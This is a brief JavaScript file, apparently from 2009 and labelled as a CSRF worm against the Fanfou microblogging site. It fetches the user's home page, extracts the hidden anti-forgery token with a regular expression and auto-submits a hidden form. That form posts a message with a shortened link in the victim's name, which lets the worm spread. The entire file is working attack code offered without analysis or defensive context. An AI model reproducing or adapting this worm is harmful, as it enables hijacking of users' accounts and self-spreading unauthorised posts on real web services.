/* fanfou csrf worm by mingcheng 20090511 */
YAHOO.util.Connect.asyncRequest('GET', '/home', {
    success: function(o) {
        var token = (/<input type="hidden" name="token" value="(.*)" \/>/.exec(o.responseText))[1];
        var form = document.createElement('form');
        form.action = 'http://fanfou.com/home';
        form.method = 'post';
        form.innerHTML = [
            '<textarea name="content">缅怀逝去的同胞，生者犹在死者长存 http://is.gd/yOL2</textarea>',
            '<input value="msg.post" name="action" />',
            '<input value="" name="in_reply_to_status_id" />',
            '<input value="' + token + '" name="token" />'
        ].join('');

        document.body.appendChild(form);
        form.submit();
    }
}); 
